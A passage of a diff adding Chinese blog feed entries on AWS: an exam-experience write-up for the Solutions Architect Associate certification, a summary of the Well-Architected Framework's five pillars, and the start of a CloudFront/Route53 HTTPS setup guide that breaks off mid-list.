+<li>根据AWS的<a href="http://aws.amazon.com/cn/documentation/" target="_blank" rel="external">官方文档</a>梳理了<a href="https://www.duyidong.com/2017/02/28/AWS-Services-Overview/">AWS现有的重要服务</a></li>
+<li>认真过了一遍关于<a href="https://www.duyidong.com/2017/03/15/AWS-EC2/">EC2</a>，<a href="https://www.duyidong.com/2017/03/06/%E6%B5%85%E8%B0%88AWS-IAM/">IAM</a>，<a href="https://www.duyidong.com/2017/03/13/AWS-S3/">S3</a>有关的文档，这几个服务加上VPC和RDS为考察的重点，同时也是AWS的核心服务</li>
+<li>在AWS上做了一些操作练习，主要包括：<ul>
+<li>在AWS上搭建了public &amp; private subnet的<a href="https://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Scenario2.html" target="_blank" rel="external">典型网络结构</a></li>
+<li>在AWS上搭建了一个ELB+Autoscaling的高可用的网站</li>
+<li><a href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/">将自己的博客迁移到AWS上</a>，并<a href="https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/">使用Cloudfront做CDN和Route53做DNS解析</a></li>
+</ul>
+</li>
+<li>仔细大量地阅读了<a href="https://aws.amazon.com/faqs/" target="_blank" rel="external">FAQ</a></li>
+<li>看了一下AWS的几个<a href="https://aws.amazon.com/whitepapers/" target="_blank" rel="external">白皮书</a>，包括<a href="https://d0.awsstatic.com/whitepapers/aws-overview.pdf" target="_blank" rel="external">AWS服务概览</a>，<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">关于架构</a>，<a href="https://d0.awsstatic.com/whitepapers/Security/AWS_Security_Best_Practices.pdf" target="_blank" rel="external">安全最佳实践</a>，<a href="https://d0.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf" target="_blank" rel="external">AWS最佳实践</a>，主要认真理解了<a href="https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/">什么样的架构是一个良好的架构</a></li>
+<li>做了大约两百道练习题，事实在上考试的时候有百分之二十的都是在见过的原题。</li>
+</ul>
+<h2 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h2><p>考试首先要在网上注册预约：<a href="https://www.webassessor.com" target="_blank" rel="external">https://www.webassessor.com</a>，需要visa卡支付，并提供公司名称，地址等信息。<br>考试地点在<a href="https://www.google.com/maps/place/Shangpu+Fortune+Center+Plaza/@30.6525977,104.0673653,17z/data=!3m1!4b1!4m5!3m4!1s0x36efc53df2a6a879:0x5c54ecee2ff20a3c!8m2!3d30.6525977!4d104.069554" target="_blank" rel="external">成都上普财富中心2514鸿景国际教育</a>，锦江宾馆地铁站出站走几步就是，是一家代理考试点，每次同时只有一个人考试，在一个独立的房间，有一位监考员，负责帮你准备考试的环境。考试原则上不允许带手机，使用考点的笔记本电脑，并且是远程连接到美国，所以网络会比较卡顿，经常做题做着做着就白屏了，需要刷新才能继续，有些考验心理素质。<br>考试是80分钟60道题，据说判断是否过关是根据一段时间考试的人的成绩取排名靠前的百分之六十的人作为比较，达到这个标准就算过关，考试完后立马知道分数。根据以往的经验，一般分数在65分以上可以过关。考试分单选和多选，多选题会有提示有几个选项，每道题可以标记“Mark this item for later review”，系统会在答题完成后给出所有待检查的题号以重新作答，还是比较方便的。<br>根据考试经验，得分往往会低于做的时候的感觉期望，由于考试时间并不紧张（笔者在完成答题后还剩半个小时交卷），一定要认真检查，最好知道每个题要考察你什么知识，很多题都是有坑的，如果你能把考察点说出来，这道题多半是没有问题的。<br>考试完后随即你就会在邮箱里收到一封这样的证书：</p>
+<p><img src="/images/AWS_Certification_SAA.jpeg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AWS方案解决架构师助理级的考试总的来说难度不大，主要考察的就是在何种需求场景下应该选择AWS的何种服务，考试分为设计一个符合<a href="https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/">最好架构</a>设计原则的系统；工具和开发；安全；以及解决问题四个部分，<strong>设计一个良好的架构</strong>是最重要的也是最能体现云服务意义的，需要好好准备。<strong>工具和开发</strong>考察的是动手操作的能力，一般做够几个实验都没什么问题。<strong>安全</strong>方方面面都有涉及，考察的比较细致，主要是针对不同场景需要使用权限管理，网络管理，服务策略管理等不同方式，配合AWS的<a href="https://d0.awsstatic.com/whitepapers/Security/AWS_Security_Best_Practices.pdf" target="_blank" rel="external">安全最佳实践白皮书</a>问题不大。最后一个<strong>解决问题</strong>在AWS文档中很多部分都是Troubleshooting，比如<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/TroubleshootingInstancesConnecting.html" target="_blank" rel="external">Troubleshooting Connecting to Your Instance</a>，<a href="http://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot.html" target="_blank" rel="external">Troubleshooting IAM</a>，<a href="https://aws.amazon.com/premiumsupport/knowledge-center/elb-connectivity-troubleshooting/" target="_blank" rel="external">Elastic Load Balancing Connectivity Troubleshooting</a>都是可能被考察的内容，需要阅读文档的时候足够仔细。<br>另外，给出一些考试资料供参考：</p>
+<blockquote>
+<ul>
+<li>AWS测试题：<ul>
+<li><a href="https://quizlet.com/152377618/aws-certified-solutions-architect-associate-practice-questions-flash-cards/" target="_blank" rel="external">https://quizlet.com/152377618/aws-certified-solutions-architect-associate-practice-questions-flash-cards/</a></li>
+<li><a href="http://www.aiotestking.com/amazon/category/exam-aws-saa-aws-certified-solutions-architect-associate/" target="_blank" rel="external">http://www.aiotestking.com/amazon/category/exam-aws-saa-aws-certified-solutions-architect-associate/</a></li>
+</ul>
+</li>
+<li>一个关于考试的feedback: <a href="https://acloud.guru/forums/aws-certified-solutions-architect-associate/discussion/-KSDNs4nfg5ikp6yBN9l/exam_feedback_-_20_specific_po" target="_blank" rel="external">https://acloud.guru/forums/aws-certified-solutions-architect-associate/discussion/-KSDNs4nfg5ikp6yBN9l/exam<em>feedback</em>-_20_specific_po</a></li>
+<li>AWS博客：<a href="https://aws.amazon.com/blogs/aws/" target="_blank" rel="external">https://aws.amazon.com/blogs/aws/</a></li>
+<li>两篇同事的博客：<ul>
+<li><a href="http://www.huangbowen.net/blog/2014/10/27/how-to-pass-the-aws-certification/" target="_blank" rel="external">http://www.huangbowen.net/blog/2014/10/27/how-to-pass-the-aws-certification/</a></li>
+<li><a href="http://www.jianshu.com/p/02233ae66b80" target="_blank" rel="external">http://www.jianshu.com/p/02233ae66b80</a></li>
+</ul>
+</li>
+<li>Jayendra的博客：<a href="http://jayendrapatil.com/" target="_blank" rel="external">http://jayendrapatil.com/</a></li>
+<li>Youtube上deep dive的视频：<a href="https://www.youtube.com/results?search_query=aws+deep+dive" target="_blank" rel="external">https://www.youtube.com/results?search_query=aws+deep+dive</a></li>
+<li>AWS官方教学小视频： <a href="https://aws.amazon.com/training/intro_series/" target="_blank" rel="external">https://aws.amazon.com/training/intro_series/</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;上周去参加了AWS助理级架构师的考试并顺利通过，是2017年的第一个小目标也是对云服务知识的一个检验，在此分享一下考试的经过和经验。&lt;/p&gt;
+&lt;h1 id=&quot;什么是AWS认证&quot;&gt;&lt;a href=&quot;#什么是AWS认证&quot; class=&quot;headerlink&quot; title=&quot;什么
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="云计算认证" scheme="https://www.duyidong.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97%E8%AE%A4%E8%AF%81/"/>
+    
+      <category term="Certification" scheme="https://www.duyidong.com/tags/Certification/"/>
+    
+      <category term="AWS认证考试" scheme="https://www.duyidong.com/tags/AWS%E8%AE%A4%E8%AF%81%E8%80%83%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS well architected framework</title>
+    <link href="https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/"/>
+    <id>https://www.duyidong.com/2017/03/23/AWS-well-architected-framework/</id>
+    <published>2017-03-23T14:01:23.000Z</published>
+    <updated>2017-04-12T13:29:31.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="AWS认为，什么样的架构是一个良好的架构"><a href="#AWS认为，什么样的架构是一个良好的架构" class="headerlink" title="AWS认为，什么样的架构是一个良好的架构"></a>AWS认为，什么样的架构是一个良好的架构</h1><p>AWS Well Architected framework，其实是亚马逊的一封<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">白皮书</a>，围绕云架构设计的安全性，可靠性，负载，花销，运维（2016年11月加入）五个支柱阐述了一个良好的架构应该遵循什么样的原则，以及一些最佳实践。<br>亚马逊在云服务届处于世界领先水平，且在十多年的云架构实践中已经积累了相当的经验，该白皮书是对这些经验的一个总结和提炼。不管是对于考试，对于成为一个云架构师，还是对于单纯的学习和了解云服务，都是一份不可多得的好材料。<br>下面附上资源地址：<a href="https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf" target="_blank" rel="external">https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf</a></p>
+<h2 id="啰嗦几句"><a href="#啰嗦几句" class="headerlink" title="啰嗦几句"></a>啰嗦几句</h2><p>自从互联网诞生以来，各互联网公司通过将自己服务器的端口暴露在公共网络的方式提供服务，普通用户通过供应商接入公共网络，与公司服务器建立连接进行数据传输，从而实现“上网”的功能。对普通用户而言，终端以外的世界都是黑盒，而对于提供服务的互联网公司而言，则要运维大量的服务器，交换机等设备，为了保证服务的可靠性，容灾能力，为了开发，测试，常常需要维护超过实际提供服务的服务器数量很多倍的基础设施。又例如，在淘宝双十一期间可能由于用户访问量基层淘宝需要临时增加一倍的服务器数量来保证服务的正常运行，而在活动结束后，又需要恢复正常的服务器数量，那么这多出来的一倍服务器难免就会造成资源浪费。而且在很多时候，传统运维的背景下，申请一台服务器时间很长，手续繁琐，为了方便，研发部门通常会申请超出所需的基础设施资源，“以备不时之需”，这样的情况也会给企业造成大量的浪费。云服务，就是为了解决这种种问题而诞生的。</p>
+<p><img src="/images/Cloud_better.png" alt=""></p>
+<p>最简单的云服务模型，就是在云服务厂商集中托管了一个超级大型的服务器群，云服务厂商通过对外租赁服务器的形式代替了互联网厂商自己维护服务器的方式。这样做的好处在于一是避免了闲置基础设施资源的浪费，二是随着云服务的不断普及，以及Agile，DevOps运动的兴起，人们对IT设施的灵活度要求越来越高，这两年Infrastructure as Code（基础设施即代码）的理念已经被越来越多的厂商应用到生产实践中去，基础设施及代码的理念，和云服务是一脉相承的，租户可以更快地申请到设备，可以更灵活的对自己的设备定制化，规定大小，容量，甚至预配置一些环境，和自己的服务紧耦合，使公司的生产活动可以跟多的关注在业务上，而不用去操心服务器的性能，预估自己能承受的访问量，从而给业务发展带来更大的发展空间。这一点表现在今年AWS大力在推行的的Serverless架构上。<br>在笔者看来，云服务并不是一个技术上的创新，而更像是一种商业模式，为了让企业更灵活的适应瞬息万变的市场和用户需求，为了使社会资源更加合理化配置，同时，云服务也是信息全球化的重要一环，为人工智能，大数据奠定了基础。</p>
+<h1 id="如何定义一个良好的架构"><a href="#如何定义一个良好的架构" class="headerlink" title="如何定义一个良好的架构"></a>如何定义一个良好的架构</h1><p>AWS从五大支柱来判定一个架构设计得是否优秀：</p>
+<ul>
+<li><strong>Security</strong>安全：保护信息，系统安全，在风险可控的前提下对外提供服务，以及迁移的策略</li>
+<li><strong>Reliability</strong>可靠：系统的容错能力和自我修复能力，系统在负载增加时动态获取计算资源以满足业务需求，以及在系统模块发生故障时自动替换掉故障模块</li>
+<li><strong>Performance Efficiency</strong>负载能力：根据系统需要，伸缩负载的能力</li>
+<li><strong>Cost Optimization</strong>资费优化：在满足需求的情况下花尽可能少的钱</li>
+<li><strong>Operational Excellence</strong>运维出色：业务连续性，系统状况监控预警能力</li>
+</ul>
+<h3 id="一般设计原则（General-Design-Principles）"><a href="#一般设计原则（General-Design-Principles）" class="headerlink" title="一般设计原则（General Design Principles）"></a>一般设计原则（General Design Principles）</h3><ul>
+<li>停止估算需要多少基础设施，架构可以根据业务情况灵活伸缩</li>
+<li>构建一个和生产环境完全一致的测试环境，你可以在测试环境完全模拟生产环境的情形，并在完成测试之后清理掉所有资源</li>
+<li>自动化使架构变更的风险更低，基础设施及代码的好处，让架构可复制，架构变更变得可追踪，且减少了很多情况认为操作带来的风险</li>
+<li>允许架构更灵活地变更，一是风险更低，因为变更可追溯，二是架构可以被及时回滚，三是彻底的变更成本很小</li>
+<li>数据驱动型架构，灵活的架构方式允许你使用面向数居的架构方式</li>
+<li>通过“game day”来提升架构，由于架构可以被轻易的复制且用户只需要按使用付费，租户可以在任意时候测试自己的架构是否存在安全漏洞，是否存在可以被改进的地方</li>
+</ul>
+<p>下面白皮书围绕以上提到的几大优秀架构的设计支柱，提出了一系列设计原则，最佳实践以及实践这些最佳实践可以用到的服务：</p>
+<h2 id="安全（Security-Pillar）"><a href="#安全（Security-Pillar）" class="headerlink" title="安全（Security Pillar）"></a>安全（Security Pillar）</h2><h3 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h3><ul>
+<li>在每一个层面引入安全：除了应用安全还应该在网络，负载均衡器，防火墙，操作系统关注安全</li>
+<li>可追溯：保证系统的每一次操作/更改都被记录日志，并对日志进行审查</li>
+<li>确保“最小权限原则”：确保每一个资源都被赋予了恰好需要的最小权限，实时审查这些权限，及时清理掉没用的权限</li>
+<li>关注在你的系统安全：根据AWS的责任划分模型，关注在用户应该负责的系统安全和数据安全层面<br><img src="https://d0.awsstatic.com/security-center/NewSharedResponsibilityModel.png" alt=""></li>
+<li>自动化安全最佳实践：使用基于应用层的策略保证安全问题能够被快速修复，例如，创建打好补丁的镜像，然后让所有之后创建的instance使用这个镜像；再例如，对常见安全问题自动响应和自动修复故障</li>
+</ul>
+<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>AWS将最佳实践划分为五个范畴：</p>
+<ul>
+<li>数据保护</li>
+<li>认证和权限管理</li>
+<li>架构保护</li>
+<li>追踪控制</li>
+<li>事件响应</li>
+</ul>
+<p>在设计你的架构之前，你需要知道谁可以对你的系统做什么，此外，你还希望确定判断每个发生在系统的事件是否安全，保护你的操作系统和服务，你需要维护和保密你的数据，你还需要做到系统对安全事件能够自动响应。</p>
+<h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><h4 id="数据保护"><a href="#数据保护" class="headerlink" title="数据保护"></a>数据保护</h4><p>确认只有必要的用户有访问部分数据的权限，确保数据在存储时被加密，传输过程中被加密，使用IAM，以下实践可以保证你的数据安全：</p>
+<ul>
+<li>AWS的用户享有对所有数据完全的控制权</li>
+<li>AWS确保用户可以轻松对自己的数据进行加密，并提供方法管理加密所使用的key，并可以通过AWS或者用户自己定义的方式自动定期更换key（Key Management Service）</li>
+<li>AWS允许开启详细的日志信息，包括文件的权限变更（CloudTrail）</li>
+<li>AWS提供极高的可用性保证你的数据不会丢失（S3）</li>
+<li>开启版本管理，可以作为数据生命周期的一部分，可以保护对数据的误操作</li>
+<li>AWS默认不会对数据做跨Region的转移或备份，即数据不会离开它所在Region的“国家/城市”</li>
+</ul>
+<p>另外两个重要的问题：</p>
+<ul>
+<li>如何保证数据存储时加密？</li>
+<li>如何确保数据传输过程的加密？（SSL）</li>
+</ul>
+<h4 id="认证和权限管理"><a href="#认证和权限管理" class="headerlink" title="认证和权限管理"></a>认证和权限管理</h4><p>通过亚马逊的AMI，租户可以完全控制根账户下每个用户，以及应用对所有资源的访问权限，确保每个User和Role只拥有必须的权限是必要的，同时确保每个资源只在被授权的情况下才能够被访问和使用。常见的权限管理包含以下内容：</p>
+<ul>
+<li>ACL（用于管理用户对于S3中存放对象的操作访问权限）</li>
+<li>基于Role的权限控制</li>
+<li>密码管理（定期更换密码）</li>
+</ul>
+<p>同样，几个问题：</p>
+<ul>
+<li>如何保证根账户的安全？（是否开启了第三方验证，是否删掉了Access Key）</li>
+<li>如何保证User和Role的权限是安全的？（是否使用Group管理用户）</li>
+<li>如何限制应用程序，脚本，或第三方工具对AWS资源的控制访问权限？</li>
+<li>如何管理Key和证书？</li>
+</ul>
+<h4 id="架构保护"><a href="#架构保护" class="headerlink" title="架构保护"></a>架构保护</h4><p>通常来说架构保护指的是对本地数据中心的保护，在AWS的白皮书中主要提到的是对于VPC的保护，主要包括VPC中的Security Group，Network Control list，路由策略</p>
+<p>几个问题：</p>
+<ul>
+<li>如何管理你的网络策略，和设备安全？（是否有内外网划分，在外网的Instance的登录验证是怎样的，有没有开启多重验证）</li>
+<li>服务层面的安全管理？（多少用户有对你资源的访问权限，是否有对这些用户进行分组管理，是否对这些用户的验证进行了强行的限制，如强密码和定期更换密码，等等）</li>
+<li>如何保证你的系统安全，如何运维监控你的服务？</li>
+</ul>
+<h4 id="追踪控制"><a href="#追踪控制" class="headerlink" title="追踪控制"></a>追踪控制</h4><p>以下服务可以用于设施变更的追溯及审查：</p>
+<ul>
+<li>CloudTrail，用于记录AWS API的每一次操作，并生成日志保存在S3中</li>
+<li>Amazon CloudWatch，用于实时监控和预警</li>
+<li>AWS Config</li>
+<li>Amazon S3</li>
+<li>Amazon Glacier</li>
+</ul>
+<p>常见问题：</p>
+<ul>
+<li>如何获取和分析你的日志？</li>
+</ul>
+<h3 id="涉及到的服务（Key-AWS-Services）"><a href="#涉及到的服务（Key-AWS-Services）" class="headerlink" title="涉及到的服务（Key AWS Services）"></a>涉及到的服务（Key AWS Services）</h3><ul>
+<li>数据保护：加密数据存储和传输：ELB, S3 &amp; RDS</li>
+<li>权限管理：IAM, MFA</li>
+<li>架构保护：VPC, NCL, SG</li>
+<li>追踪控制：CloudTrail, Config, CloudWatch</li>
+</ul>
+<h2 id="可靠性（Reliability-Pillar）"><a href="#可靠性（Reliability-Pillar）" class="headerlink" title="可靠性（Reliability Pillar）"></a>可靠性（Reliability Pillar）</h2><h3 id="设计原则-1"><a href="#设计原则-1" class="headerlink" title="设计原则"></a>设计原则</h3><ul>
+<li>测试覆盖率</li>
+<li>自动修复错误</li>
+<li>水平扩展</li>
+<li>停止猜测生产力</li>
+<li>自动追踪架构变更</li>
+</ul>
+<h3 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h3><h4 id="建立基础"><a href="#建立基础" class="headerlink" title="建立基础"></a>建立基础</h4><p>在开始架构设计之前，选择Region，确立方案。</p>
+<ul>
+<li>如何管理AWS对服务数量的限制</li>
+<li>如何设计网络拓扑</li>
+<li>是否有预留空间用于处理技术难题</li>
+</ul>
+<h4 id="变更管理"><a href="#变更管理" class="headerlink" title="变更管理"></a>变更管理</h4><p>这里说的变更主要指的是架构的水平扩展</p>
+<ul>
+<li>如何根据业务需求进行系统变更</li>
+<li>如何监控变更</li>
+<li>如何执行变更（自动化）</li>
+</ul>
+<h4 id="容错管理"><a href="#容错管理" class="headerlink" title="容错管理"></a>容错管理</h4><ul>
+<li>数据备份</li>
+<li>灾难恢复</li>
+<li>如何应对应用组件失效</li>
+<li>如何对系统弹性进行测试</li>
+</ul>
+<h3 id="涉及到的服务"><a href="#涉及到的服务" class="headerlink" title="涉及到的服务"></a>涉及到的服务</h3><ul>
+<li>建立基础：IAM, VPC</li>
+<li>变更管理：CloudTrail</li>
+<li>容错管理：CloudFormation</li>
+</ul>
+<h2 id="性能负载（Performance-Efficiency-Pillar）"><a href="#性能负载（Performance-Efficiency-Pillar）" class="headerlink" title="性能负载（Performance Efficiency Pillar）"></a>性能负载（Performance Efficiency Pillar）</h2><p>这一个支柱的核心思想是如何使用变更的计算资源来满足日益变化的业务需求</p>
+<h3 id="设计原则-2"><a href="#设计原则-2" class="headerlink" title="设计原则"></a>设计原则</h3><ul>
+<li>为用户隐藏更多的细节让用户可以轻松调度资源，更关注在产品的业务价值</li>
+<li>数分钟内让服务发布到全球</li>
+<li>使用无服务（Serverless）架构</li>
+<li>更容易实验</li>
+<li>使用最符合用户想要实现的技术方法。例如，在选择数据库或存储方法时考虑数据访问模式。</li>
+</ul>
+<h3 id="最佳实践-2"><a href="#最佳实践-2" class="headerlink" title="最佳实践"></a>最佳实践</h3><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><ul>
+<li>架构：数据驱动/事件驱动/ETL(数据仓储)/Pipeline，架构的选择决定了以下几种资源的选择</li>
+<li>计算：Instance（type, monitor, quantity ）/Container/Function，同时要考虑到水平扩展能力</li>
+<li>存储：涉及到存储服务选择（S3/S3 IA/S3 RRS/Glacier），存储介质选择（SSD/HDD）<ul>
+<li>存储方式：块存储、文件存储、对象存储</li>
+<li>访问方式：随机还是连续</li>
+<li>吞吐量要求</li>
+<li>访问频率：在线、离线、存档</li>
+<li>更新频率：缓慢变更、动态实时更新</li>
+<li>可用性限制</li>
+<li>数据耐久度限制</li>
+</ul>
+</li>
+<li>数据库：RDS/DynamoDB/Redshift</li>
+<li>网络：考虑地址，网络延迟（是否需要PlacementGroup），在各服务组合方式中寻找合适的配置Cloudfront, VPC, DirectConnect, Route53</li>
+</ul>
+<h4 id="回顾审视"><a href="#回顾审视" class="headerlink" title="回顾审视"></a>回顾审视</h4><p>设计好一个架构，应该再次审视你的架构是如何配合业务需求的，以及随着业务的改变，当引入新的资源类型和功能时，如何确保继续拥有最合适的资源配置？</p>
+<h4 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h4><p>如何监控服务器负载和性能</p>
+<h4 id="时间空间的平衡"><a href="#时间空间的平衡" class="headerlink" title="时间空间的平衡"></a>时间空间的平衡</h4><p>如何用增加空间，冗余备份的方式提高系统响应速度，增加性能负载。最明显的例子就是利用Cloudfront将静态文件缓存到各个节点从而增加各个地区的访问速度</p>
+<h3 id="涉及到的服务-1"><a href="#涉及到的服务-1" class="headerlink" title="涉及到的服务"></a>涉及到的服务</h3><ul>
+<li>选择<ul>
+<li>计算：Auto Scaling是关键，确保你拥有合适数量的Instance来满足业务需求</li>
+<li>存储：EBS提供灵活多样的存储介质及参数，比如SSD, PIOPS，S3提供了静态文件交付方式，Amazon S3 Transfer Acceleration使用户可以远距离，快速，方便，安全的传输大文件</li>
+<li>数据库： RDS（IOPS，Read Replicas）DynamoDB可以灵活扩展且提供毫秒级延迟的服务</li>
+<li>网络：Route53可以提供根据地区延迟分发的路由策略，VPC endpoint(NAT, VPN, Direct Connect)开启灵活的网络互连</li>
+</ul>
+</li>
+<li>回顾审视：<a href="https://aws.amazon.com/blogs/aws/" target="_blank" rel="external">AWS Blog</a>和<a href="https://aws.amazon.com/new/" target="_blank" rel="external">AWS What’s New section</a>可以看到AWS又推出了何种新服务</li>
+<li>监控：AWS CloudWatch提供了不同维度(Metrics)的监控，触发事件(alarms)，以及提示(Notifications)，可以配合Lambda对监控事件作出反应</li>
+<li>空间换时间：AWS ElastiCache，Cloudfront，Snowball，以及RDS的Read Replicas都是为了空间换时间的典型</li>
+</ul>
+<h2 id="费用优化（Cost-Optimization-Pillar）"><a href="#费用优化（Cost-Optimization-Pillar）" class="headerlink" title="费用优化（Cost Optimization Pillar）"></a>费用优化（Cost Optimization Pillar）</h2><h3 id="设计原则-3"><a href="#设计原则-3" class="headerlink" title="设计原则"></a>设计原则</h3><ul>
+<li>采用消费模式：根据使用情况实时变更资源配置，而不是精确估计资源使用情况</li>
+<li>收益与经济规模：因为AWS拥有比单个企业大得多的经济规模，可以在各个企业的需求之间平衡资源需求，所以价格将会更加便宜</li>
+<li>停止在自建数据中心中的投入</li>
+<li>分析支出：云使得资源利用率和成本更加透明，有助于企业主衡量投资回报率，并为用户提供优化资源降低成本的机会</li>
+<li>托管服务降低成本</li>
+</ul>
+<h3 id="最佳实践-3"><a href="#最佳实践-3" class="headerlink" title="最佳实践"></a>最佳实践</h3><ul>
+<li>更佳有效地利用资源</li>
+<li>更贴近业务需求</li>
+<li>支出意识：<ul>
+<li>清楚地认识到哪些服务是会被收费的，收费方式怎样，哪些服务是免费的</li>
+<li>监控支出</li>
+<li>及时关闭不被使用的资源</li>
+<li>给资源配置权限管理以控制花费</li>
+</ul>
+</li>
+<li>随时优化</li>
+</ul>
+<h3 id="涉及到的服务-2"><a href="#涉及到的服务-2" class="headerlink" title="涉及到的服务"></a>涉及到的服务</h3><ul>
+<li>有效利用资源：对于EC2，申请预留实例以减少开销，使用 AWS Trusted Advisor 找到可以减少花费的方式</li>
+<li>贴近业务需求：Auto Scaling</li>
+<li>支出意识：CloudWatch用于监控花费情况，SNS用于提示超出预算的花费</li>
+<li>随时优化：<a href="https://aws.amazon.com/blogs/aws/" target="_blank" rel="external">AWS Blog</a>和<a href="https://aws.amazon.com/new/" target="_blank" rel="external">AWS What’s New section</a>以及 AWS Trusted Advisor</li>
+</ul>
+<h2 id="运维出色（Operational-Excellence-Pillar）"><a href="#运维出色（Operational-Excellence-Pillar）" class="headerlink" title="运维出色（Operational Excellence Pillar）"></a>运维出色（Operational Excellence Pillar）</h2><p>运维出色应该是AWS配合DevOps运动推出的一系列实践：</p>
+<h3 id="设计原则-4"><a href="#设计原则-4" class="headerlink" title="设计原则"></a>设计原则</h3><ul>
+<li>使用代码执行运维操作：运维的一个发展趋势是越来越自动化，比如我们可以用自动配置管理工具配置更改环境，响应实践等</li>
+<li>强调配合业务需求的运维：将运营流程与业务目标相一致，减少不必要的运维指标</li>
+<li>定期，小步，增量式的运维：工作负载应设计为允许组件定期更新，运维的更新也应该小步前进，且容易被回滚，在维护和更换组件时不应造成宕机时间</li>
+<li>启用测试以对运维的误操作及时响应：对于组件更替和运维的操作应该有测试，及时发现变更错误以便于修复或回滚</li>
+<li>在错误中学习：定期回顾对运维事件的处理方法以改进，持续推动卓越运维</li>
+<li>保持操作流程：团队之间相互学习，及时更新文档，保证团队运维操作有统一流程，统一的运维方式</li>
+</ul>
+<h3 id="最佳实践-4"><a href="#最佳实践-4" class="headerlink" title="最佳实践"></a>最佳实践</h3><ul>
+<li>准备：何种最佳实践？选用何种配置管理？</li>
+<li>开始作业：如何小步前进，如何监控每一次运维操作？</li>
+<li>响应：如何对计划之外的运维操作做出响应？</li>
+</ul>
+<h3 id="涉及到的服务-3"><a href="#涉及到的服务-3" class="headerlink" title="涉及到的服务"></a>涉及到的服务</h3><ul>
+<li>准备：AWS Config，AWS Service Catalog，使用Auto Scaling和SQS来保证运维的连续性</li>
+<li>作业：这一部分主要是CI/CD: AWS CodeCommit, AWS CodeDeploy, and AWS CodePipeline</li>
+<li>响应：CloudWatch alarm</li>
+</ul>
+<h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><p>可以看到AWS对于优秀网站的设计，除了一般要求的可靠，省钱，还根据云服务的基础设施可灵活变更的特点强调了水平扩展和架构灵活变更，以更好地满足业务需要，保证<code>业务连续性</code>(business continuity)<br>白皮书最后还给出了FAQ（Frequently asked questions）部分回答了一些关于最佳实践的常见问题，非常值得一看。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;AWS认为，什么样的架构是一个良好的架构&quot;&gt;&lt;a href=&quot;#AWS认为，什么样的架构是一个良好的架构&quot; class=&quot;headerlink&quot; title=&quot;AWS认为，什么样的架构是一个良好的架构&quot;&gt;&lt;/a&gt;AWS认为，什么样的架构是一个良好的架构&lt;/h1&gt;&lt;
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+      <category term="Cloud Native" scheme="https://www.duyidong.com/tags/Cloud-Native/"/>
+    
+      <category term="架构" scheme="https://www.duyidong.com/tags/%E6%9E%B6%E6%9E%84/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Enable HTTPS and CDN with Cloudfront</title>
+    <link href="https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/"/>
+    <id>https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/</id>
+    <published>2017-03-20T12:23:37.000Z</published>
+    <updated>2017-04-12T13:28:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="使用AWS解锁HTTPS和CDN"><a href="#使用AWS解锁HTTPS和CDN" class="headerlink" title="使用AWS解锁HTTPS和CDN"></a>使用AWS解锁HTTPS和CDN</h1><p>在上一篇博客中，笔者已经介绍了<a href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/">将hexo博客发布到S3</a>，这一部分我将介绍如何使用AWS的Route53应用上自己的域名，以及如何使用Cloudfront开启HTTPS/HTTP2和CDN加速。</p>
+<h2 id="关于Route53"><a href="#关于Route53" class="headerlink" title="关于Route53"></a>关于Route53</h2><p>Route53是AWS提供的DNS服务，提供常见域名服务，用户可以使用Route53注册使用域名，指向自己的服务，可以除了一般域名服务都支持的A类地址（直接指向IP），及CNAME（指向另一个域名）以外，Route53还支持一个功能叫做A-record，即可以将DNS指向AWS内部的资源，该服务功能与CNAME基本相同，但是免费。此外，Route53支持以下几种路由策略：</p>
+<ul>
+<li><strong>Simple Routing Policy</strong>：通常在只有一个资源的时候使用这种策略，该种策略会自由（平均）分配负载给所属资源</li>
+<li><strong>Weighted Routing Policy</strong>：加权路由，这种路由策略支持用户指定的路由百分比，比如百分之20的流量导入测试环境，百分之80的流量导入产品环境，用于进行AB测试。</li>
+<li><strong>Latency Routing Policy</strong>：该种策略会根据客户端访问的延迟情况选择合适的服务，比如一个客户访问A延迟为20毫秒，访问B服务延迟为250毫秒，那Latency Routing就会把该用户的访问导入A服务。</li>
